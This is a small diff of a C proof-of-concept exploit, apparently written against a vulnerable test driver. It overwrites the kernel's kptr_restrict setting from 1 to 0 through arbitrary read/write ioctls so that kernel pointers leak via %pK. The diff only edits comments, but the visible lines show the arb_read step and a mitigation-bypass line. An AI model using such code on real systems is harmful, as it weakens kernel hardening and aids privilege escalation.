@@ -1,4 +1,4 @@
-// FZY: Add a simple proof of concept that overwrites kptr_restrict from 1 to 0, allowing unprivileged users to leak information via %pK format specifier
+// SDP: Add a simple proof of concept that overwrites kptr_restrict from 1 to 0, allowing unprivileged users to leak information via %pK format specifier
 
 #include <fcntl.h>
 #include <stdio.h>
@@ -130,7 +130,7 @@ void test_kptr_format(int fd) {
     return;
   }
   
-  // FZY: ARB_PRINT_KPTR emits exactly 2 lines, so only show those to avoid
+  // ARB_PRINT_KPTR emits exactly 2 lines, so only show those to avoid
   // repeating the output of an earlier call
   printf("[+] Ioctl successful! Now check dmesg:\n");
   fflush(stdout);
@@ -138,7 +138,7 @@ void test_kptr_format(int fd) {
 }
 
 int main(int argc, char *argv[]) {
-  // FZY: Keep our printf output in order with the output of system()/popen()
+  // Keep our printf output in order with the output of system()/popen()
   // children, which write to fd 1 directly
   setvbuf(stdout, NULL, _IOLBF, 0);
 
@@ -171,7 +171,7 @@ int main(int argc, char *argv[]) {
     arb_read(arbrw_dev_fd, kptr_restrict_addr, &kptr_restrict_addr, sizeof(unsigned long));
     printf("[+] kptr_restrict address from kernel: 0x%lx\n", kptr_restrict_addr);
   
-    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
     // kptr_restrict_addr = kptr_restrict_addr | 0xFFFF000000000000;
   }
   
